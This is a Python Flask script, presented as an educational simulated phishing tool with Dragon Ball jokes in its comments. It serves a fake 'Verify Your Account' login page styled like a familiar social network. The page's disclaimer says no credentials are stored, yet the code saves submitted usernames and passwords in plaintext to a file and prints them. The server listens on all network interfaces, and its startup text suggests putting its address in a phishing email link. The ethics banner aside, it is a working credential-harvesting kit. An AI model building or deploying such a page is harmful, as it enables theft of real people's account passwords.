# login_server.py - Simulated Phishing Login Page Server (Educational Tool)
# This tool is for ethical training and educational purposes ONLY.
# Do NOT use this tool for any malicious or unauthorized activities.


from flask import Flask, request, render_template_string
import os
import datetime

app = Flask(__name__)

# HTML for our login page
# DRAGON BALL IS THE BEST ANIME EVER!
# take this part as the hyperbolic time chamber but for credentials they go in but dont come out

# this is HTML use to make web pages look pretty
# and there is css to make it look even better
login_page_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .flex-container {
            display: flex;
            align-items: center;
            gap: 40px;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        .login-container h2 {
            color: #1c1e21;
            margin-bottom: 25px;
            font-size: 24px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: calc(100% - 20px);
            padding: 12px 10px;
            margin-bottom: 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .login-container button:hover {
            background-color: #166fe5;
        }
        .disclaimer {
            margin-top: 20px;
            font-size: 0.85em;
            color: #65676b;
            border-top: 1px solid #dddfe2;
            padding-top: 15px;
        }
        .side-gif {
            max-width: 180px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="flex-container">
        <div class="login-container">
            <h2>Verify Your Account</h2>
            <p>For your security, please re-enter your credentials.</p>
            <form action="/submit_credentials" method="post">
                <input type="text" name="username" placeholder="Email or Phone" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <p class="disclaimer">
                This is a simulated page for educational purposes only.
                No real credentials are being processed or stored externally.
                Just like training to go Super Saiyan, this is practice!
                kakarotto!
            </p>
        </div>
        <img src="https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3N2x3MWVteHhlMXJjbnNvZTBjMXA0N2JqMGdybm9meWttZTM3cjB1dSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/o9Du5r8Q4TWUtgaXnE/giphy.gif" 
        alt="Side GIF" class="side-gif">
    </div>
</body>
</html>
""" 

# where we the credentials  will be stored
LOG_FILE = "credentials.txt"

@app.route('/')
def index():
    """
    make or render the login page"""
    return render_template_string(login_page_html)

@app.route('/submit_credentials', methods=['POST']) #POST means we are sending data
def submit_credentials():
    """
    handle the credentials submitted by the user"""
    
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - Username: {username}, Password: {password}\n"

        with open(LOG_FILE, 'a') as log_file:
            log_file.write(log_entry)
        print(f"Credentials logged: {log_entry.strip()}")
        # Whats his power level 
        # its over 9000! (its just the time and credentials)
        return "<h1>Verification Successful!</h1><p>Thank you for verifying your account. You will be redirected shortly.</p><script>setTimeout(function(){ window.location.href = 'https://youtu.be/GBIIQ0kP15E?si=QAjS1T0wr7nWu1LI'; }, 3000);</script>"
    else:
        return "<h1>Error</h1><p>Invalid credentials provided. Please try again.</p>"   
    
if __name__ == '__main__':
    print("--- Simulated Phishing Login Server (Educational Tool) ---")
    print("WARNING: This tool is for ethical training ONLY. Use responsibly.")
    print("WITH GREAT POWER COMES GREAT RESPONSIBILITY!")
    print(f"Captured credentials will be saved to: {os.path.abspath(LOG_FILE)}")
    print("\nTo run this server, open your terminal and navigate to this directory.")
    print("Then run: python login_server.py")
    print("\nOnce running, open your web browser and go to: http://127.0.0.1:5000/")
    print("You can also use this address in your phishing email link.")
    app.run(debug=True, host='0.0.0.0', port=5000)  # Run the Flask server on all network interfaces
    # debug=True allows for live reloading and better error messages
   
